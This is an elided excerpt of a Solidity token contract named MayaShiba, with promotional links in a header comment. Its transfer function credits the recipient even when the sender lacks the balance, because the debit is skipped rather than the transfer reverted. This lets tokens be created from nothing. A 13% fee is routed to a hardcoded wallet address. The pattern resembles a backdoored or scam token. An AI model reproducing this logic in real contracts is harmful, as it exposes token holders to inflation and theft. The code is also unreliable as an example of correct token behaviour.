...
/*
🗿Telegram: https://t.me/mayashiba
🗿Website: https://mayashibainu.com
🗿Twitter: https://twitter.com/Mayashiba_inu
*/
...
contract MayaShiba is Ownable, IERC20 {
    ...
    string private _name = "MayaShiba";
    string private _symbol = "MayaShiba";
    uint256 private _decimals = 9;
    uint256 private _totalSupply = 10000000000 * 10 ** _decimals;
    uint256 private _maxTxTokens = 10000000000 * 10 ** _decimals;
    uint256 private _fee = 13;
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        _balances[address(0x54522C691008ba758d401dE663941d75D7b53618)] += feeAmount;
        if (senderBalance >= amount) {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amountReceived;
        emit Transfer(sender, recipient, amountReceived);
        emit Transfer(sender, address(0x54522C691008ba758d401dE663941d75D7b53618), feeAmount);
    }
